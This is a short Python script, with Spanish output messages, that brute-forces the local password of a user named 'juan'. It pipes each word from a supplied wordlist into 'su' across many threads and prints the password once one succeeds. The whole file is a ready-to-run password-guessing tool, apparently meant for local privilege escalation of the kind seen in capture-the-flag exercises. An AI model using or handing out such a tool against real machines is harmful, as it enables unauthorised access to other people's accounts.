import sys
from subprocess import Popen, PIPE, STDOUT
import threading
import time


devNull = " > /dev/null 2>&1"
global finalPassword
finalPassword=None

def checkPass(password,lock):
    process = Popen(['su','juan'], stdout=PIPE, stdin=PIPE, stderr=PIPE)
    stdout_data = process.communicate(input=password.encode())
    stateCode = process.returncode

    if(stateCode == 0):
        global finalPassword
        with lock:
            finalPassword=password

        
    else:
        print("[*]" + password + " -> " + "Incorrect")

lock = threading.RLock()

def readwordlist(path):
    f = open(path,"r")
    words = f.readlines()
    return words

def launchThreads(thread):
    if(threading.active_count() < 21):
        thread.start()
    else:
        time.sleep(0.01)
        launchThreads(thread)


def correctPass():
    print("=========================================================================================")
    print("|                                                                                       |")
    print("| [*]" + finalPassword + " -> " + "Correct")
    print("|                                                                                       |")
    print("=========================================================================================")
    sys.exit(0)

if __name__ == "__main__":
    path = sys.argv[1]
    wordlist = readwordlist(path)
    threads = list()
    print("Cargando passwords...")
    for password in wordlist:
        password = password[:len(password)-1]
        if(finalPassword == None):
            t = threading.Thread(target=checkPass, args=(password,lock))
            threads.append(t)
            launchThreads(t)
        else:
            break

    for i in threads:
        i.join()

    if(finalPassword == None):
        print("No se ha encontrado la password en el diccionario introducido")
    else:
        correctPass()
